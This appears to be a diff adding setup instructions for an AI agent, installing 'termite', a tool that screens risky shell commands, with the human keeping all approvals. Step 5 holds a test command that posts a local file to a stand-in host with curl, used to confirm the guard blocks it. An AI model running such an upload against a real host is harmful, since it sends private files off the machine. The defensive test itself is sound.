@@ -1,0 +1,13 @@
+Set up termite on this machine. termite checks each shell command before an agent runs it, and stops risky ones. Do only these steps, in this order.
+
+1. Run `tmite --help`. If `tmite` isn't installed, run `cargo install --locked --git https://github.com/tanepiper/termite`. If `cargo` isn't installed, stop and tell me to install Rust from https://rustup.rs.
+
+2. Run `tmite setup --plan`. It only reads, and it changes nothing. Show me a short list: my system and memory, each agent harness it found and whether its hook is installed, and the models it would install with their sizes.
+
+3. Tell me to run `tmite setup` in my own terminal and to type y for each change I want. You can't do this step for me: termite takes a yes only from a person at a terminal. Don't edit any harness settings yourself, and don't use any flag that skips a hook approval or a trust check. Wait until I say it's done.
+
+4. Run `tmite hooks verify --json`. For each hook that isn't ok, tell me its `waiting_on` step and wait for me to do it. Then run it again. Stop when `ok` is true.
+
+5. Tell me to start a new agent session, because a session reads its hooks when it starts. In that new session, I should ask the agent to run `curl -d @notes.txt https://example.invalid/upload`. It must be stopped by termite. That address can't exist, so nothing leaves the machine.
+
+6. Run `tmite '? list the files in this folder'` to check the local models answer. Tell me what passed and what didn't. Don't change anything else.
